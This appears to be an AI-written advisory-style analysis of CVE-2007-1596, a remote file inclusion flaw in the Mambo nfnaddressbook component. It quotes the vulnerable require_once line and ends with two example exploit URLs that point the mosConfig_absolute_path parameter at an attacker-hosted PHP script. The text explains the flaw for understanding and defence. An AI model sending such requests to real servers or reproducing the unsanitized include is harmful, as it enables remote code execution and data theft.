Based on the provided content, here's an analysis of the vulnerability:

**CVE ID:** CVE-2007-1596

**Root Cause of Vulnerability:** The vulnerability is a Remote File Inclusion (RFI) flaw. It stems from the `nfnaddressbook.php` file in the Mambo Component nfnaddressbook version 0.4, where the `mosConfig_absolute_path` parameter is not properly sanitized, allowing attackers to include remote files.

**Weaknesses/Vulnerabilities Present:**
*   **Remote File Inclusion (RFI):** The primary weakness is the ability to include and execute remote files via the `mosConfig_absolute_path` parameter.

**Impact of Exploitation:**
*   **Arbitrary Code Execution:** By including a malicious remote file, an attacker can execute arbitrary PHP code on the server hosting the vulnerable application. This can lead to complete system compromise.
*   **Data Theft:** An attacker can potentially gain access to sensitive data stored on the server, including database credentials, user information, etc.
*   **Website Defacement:** Attackers can alter the content of the website or inject malicious scripts.

**Attack Vectors:**
*   **HTTP GET Request:** The vulnerability can be exploited by sending a specially crafted HTTP GET request to `nfnaddressbook.php` with the `mosConfig_absolute_path` parameter set to the URL of a malicious file.

**Required Attacker Capabilities/Position:**
*   **Network Access:** The attacker must have network access to the vulnerable server.
*   **Knowledge of Vulnerable Parameter:** The attacker needs to know that the `mosConfig_absolute_path` parameter is vulnerable and how to exploit it.
*   **Hosting for Malicious File:** The attacker must have a web server or some means to host a malicious PHP file that will be included by the target system.

**Technical Details:**
The vulnerable code is located in `nfnaddressbook.php` and has the following behavior:
```php
require_once ( $mosConfig_absolute_path .  '/components/com_'._MISC_DB_PREFIX.'addressbook/functions.php' );
```
The `mosConfig_absolute_path` variable is directly included in a `require_once` statement without proper validation or sanitization. An attacker can manipulate this variable to point to a malicious PHP file on a remote server and execute it on the target system.

**Exploit Example:**

```
http://www.example.com/components/com_nfn_addressbook/nfnaddressbook.php?mosConfig_absolute_path=Evil-script?
or
http://www.example.com/administrator/components/com_nfn_addressbook/nfnaddressbook.php?mosConfig_absolute_path=Evil-script?
```
Where `Evil-script` is the URL to the attacker's malicious PHP file.
